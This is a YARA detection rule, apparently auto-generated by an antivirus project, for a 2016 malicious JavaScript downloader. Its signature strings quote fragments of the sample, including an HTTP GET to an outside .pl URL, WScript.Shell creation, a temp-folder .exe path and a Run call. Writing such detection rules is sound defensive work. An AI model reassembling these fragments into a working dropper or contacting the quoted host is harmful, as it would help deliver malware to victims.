rule sig_20160330_5cdd6050ac7c09f18e48273c3057b33f {
  meta:
    description = "datamaliciousorder - file 20160330_5cdd6050ac7c09f18e48273c3057b33f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "df316fc55bd1b62e3415e0685973bdf6eafb1f030749ca57f06cfdda10030b1c"

  strings:
    $s1  = "PP[W](\"GET\", \"http://xn--po-wqa.pl/a8zkde\", false);" fullword ascii
    $s2  = "var JD = function LN() {return WScript[HW](\"WScript\"+\".Shell\");}(), K = 11;" fullword ascii
    $s3  = "function U(S0, MY){S = S * 1; return S0 - MY;};" fullword ascii
    $s4  = "if (PP[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function PW() {return JD[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"tEg6v9sxTqKJVjlC.ex\" + \"e\";};" fullword ascii
    $s6  = "function TT(){return I + \"\";};" fullword ascii
    $s7  = "function XX(A){JD[\"Run\"](A, S, S);};" fullword ascii
    $s8  = "function X() {return ((E == true) && (E == DO)) ? 1 : S;};" fullword ascii
    $s9  = "var B = new this[\"Date\"]();" fullword ascii
    $s10 = "function L(){return 22;};" fullword ascii
    $s11 = "function H(){return HW;};" fullword ascii
    $s12 = "}while (O);" fullword ascii
    $s13 = "return U(M, T);" fullword ascii
    $s14 = "function P()" fullword ascii
    $s15 = "function NS(FR) {var KP = (1, 2, 3, 4, 5, FR); return KP;};" fullword ascii
    $s16 = "E = true; " fullword ascii
    $s17 = "DO = true; " fullword ascii
    $s18 = "var CC = false;" fullword ascii
    $s19 = "var DO = false;" fullword ascii
    $s20 = "} catch(JU){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}